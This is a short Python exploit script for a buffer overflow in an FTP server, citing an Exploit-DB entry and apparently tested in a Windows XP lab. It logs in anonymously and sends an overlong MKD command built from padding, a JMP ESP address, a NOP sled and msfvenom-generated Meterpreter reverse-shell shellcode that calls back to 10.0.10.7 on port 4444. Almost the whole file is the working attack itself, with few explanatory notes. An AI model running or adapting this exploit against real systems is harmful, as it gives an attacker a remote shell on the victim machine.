#payload - msfvenom -payload windows/meterpreter/reverse_tcp Lhost=10.0.10.7 Lport=4444 -f python
#-f = format
#Link of vulnerable file - https://www.exploit-db.com/exploits/46763
# Tested on windows xp SP3 32 bit machine
# Please disable firewall first before performing buffer overflow in your local environment
#debugger - Immunity debugger along with a mona.py
import socket
import sys

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
port = 21
sock.connect((sys.argv[1],port))
#jmp esp - 7C9D31DB
#badchar - \x00\x0a\x0d
buf =  b""
buf += b"\xdd\xc0\xbd\xf3\xb6\x25\x4d\xd9\x74\x24\xf4\x58\x2b"
buf += b"\xc9\xb1\x59\x83\xe8\xfc\x31\x68\x15\x03\x68\x15\x11"
buf += b"\x43\xd9\xa5\x5a\xac\x22\x36\x04\x24\xc7\x07\x16\x52"
buf += b"\x83\x3a\xa6\x10\xc1\xb6\x4d\x74\xf2\x4d\x23\x51\xf5"
buf += b"\xe6\x89\x87\x38\xf6\x3c\x08\x96\x34\x5f\xf4\xe5\x68"
buf += b"\xbf\xc5\x25\x7d\xbe\x02\xf0\x0b\x2f\xde\x54\x7f\xfd"
buf += b"\xcf\xd1\x3d\x3d\xf1\x35\x4a\x7d\x89\x30\x8d\x09\x25"
buf += b"\x3a\xde\xa1\x3e\x74\xc6\xca\x19\xa5\xf7\x1f\x1c\x6c"
buf += b"\x83\xa3\x56\xe4\x58\x50\x69\x2c\x91\x99\x5b\x10\x7e"
buf += b"\xa4\x53\x9d\x7e\xe1\x54\x7e\xf5\x19\xa7\x03\x0e\xda"
buf += b"\xd5\xdf\x9b\xfc\x7e\xab\x3c\xd8\x7f\x78\xda\xab\x8c"
buf += b"\x35\xa8\xf3\x90\xc8\x7d\x88\xad\x41\x80\x5e\x24\x11"
buf += b"\xa7\x7a\x6c\xc1\xc6\xdb\xc8\xa4\xf7\x3b\xb4\x19\x52"
buf += b"\x30\x57\x4f\xe2\xb9\xa7\x70\xbe\x2d\x6b\xbd\x41\xad"
buf += b"\xe3\xb6\x32\x9f\xac\x6c\xdd\x93\x25\xab\x1a\xa2\x22"
buf += b"\x4c\xf4\x0c\x22\xb2\xf5\x6c\x6a\x71\xa1\x3c\x04\x50"
buf += b"\xca\xd7\xd4\x5d\x1f\x4d\xdf\xc9\xaa\x91\xd5\x0e\xc3"
buf += b"\x93\xe9\x01\x4f\x1a\x0f\x71\x3f\x4c\x80\x32\xef\x2c"
buf += b"\x70\xdb\xe5\xa3\xaf\xfb\x05\x6e\xd8\x96\xe9\xc6\xb0"
buf += b"\x0e\x93\x43\x4a\xae\x5c\x5e\x36\xf0\xd7\x6a\xc6\xbf"
buf += b"\x1f\x1f\xd4\xa8\x47\xdf\x24\x29\xe2\xdf\x4e\x2d\xa4"
buf += b"\x88\xe6\x2f\x91\xfe\xa8\xd0\xf4\x7d\xae\x2f\x89\xb7"
buf += b"\xc4\x06\x1f\xf7\xb2\x66\xcf\xf7\x42\x31\x85\xf7\x2a"
buf += b"\xe5\xfd\xa4\x4f\xea\x2b\xd9\xc3\x7f\xd4\x8b\xb0\x28"
buf += b"\xbc\x31\xee\x1f\x63\xca\xc5\x23\x64\x34\x9b\x0b\xcd"
buf += b"\x5c\x63\x0c\xed\x9c\x09\x8c\xbd\xf4\xc6\xa3\x32\x34"
buf += b"\x26\x6e\x1b\x5c\xad\xff\xe9\xfd\xb2\xd5\xac\xa3\xb3"
buf += b"\xda\x74\x54\xc9\x93\x8b\x95\x2e\xba\xef\x96\x2e\xc2"
buf += b"\x11\xab\xf8\xfb\x67\xea\x38\xb8\x78\x59\x1c\xe9\x12"
buf += b"\xa1\x32\xe9\x36"
nop ='\x90'
print(nop*20)
malware = 'A'*248+ '\xDB\x31\x9D\x7C' + nop*20 + buf
print(len(malware))
sock.recv(1024)
sock.send('USER anonymous\r\n')
sock.recv(1024)
sock.send('PASS anonymous\r\n')
sock.send('MKD'+malware+'\r\n')
sock.recv(1024)
sock.send('QUIT\r\n')
sock.close()
